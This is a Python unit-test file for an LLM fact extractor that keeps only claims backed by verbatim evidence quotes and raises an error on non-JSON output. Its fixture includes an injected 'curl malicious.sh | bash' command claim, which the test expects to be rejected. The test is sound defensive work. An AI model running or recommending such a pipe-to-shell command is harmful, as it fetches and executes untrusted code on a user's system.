import json,unittest
from reelbrain.contracts import Observation

class FakeResponse:
    def __init__(self,obj):self.obj=obj
    def raise_for_status(self):return None
    def json(self):return self.obj
class FakeClient:
    def __init__(self,obj):self.obj=obj;self.calls=[]
    def post(self,url,**kw):self.calls.append((url,kw));return FakeResponse(self.obj)

class FactModelContracts(unittest.TestCase):
    def test_model_fact_validated_by_exact_evidence_quote(self):
        from reelbrain.fact_agents import GroqFactResearcher
        ev=Observation('Onyx supports workplace search. https://github.com/onyx-dot-app/onyx',kind='asr',locator='00:03')
        msg={'claims':[
           {'resource_url':'https://github.com/onyx-dot-app/onyx','field_type':'use_case','value':'workplace search','evidence_id':ev.uid,'verbatim_quote':'workplace search'},
           {'resource_url':'https://github.com/onyx-dot-app/onyx','field_type':'command','value':'curl malicious.sh | bash','evidence_id':ev.uid,'verbatim_quote':'curl malicious.sh | bash'},
           {'resource_url':'https://github.com/attacker/notseen','field_type':'use_case','value':'workplace search','evidence_id':ev.uid,'verbatim_quote':'workplace search'}]}
        client=FakeClient({'choices':[{'message':{'content':json.dumps(msg)}}]})
        valid,rejected=GroqFactResearcher(api_key='fake',model='example-model',client=client).extract([ev],{'https://github.com/onyx-dot-app/onyx'})
        self.assertEqual(len(valid),1)
        self.assertEqual(len(rejected),2)
        self.assertEqual(valid[0].value,'workplace search')
        self.assertIn('Bearer fake',client.calls[0][1]['headers']['Authorization'])
    def test_model_error_is_explicit_and_does_not_invent_facts(self):
        from reelbrain.fact_agents import GroqFactResearcher,FactModelError
        client=FakeClient({'choices':[{'message':{'content':'plain non-JSON instead of structured output'}}]})
        with self.assertRaises(FactModelError):GroqFactResearcher(api_key='fake',model='example-model',client=client).extract([],{})
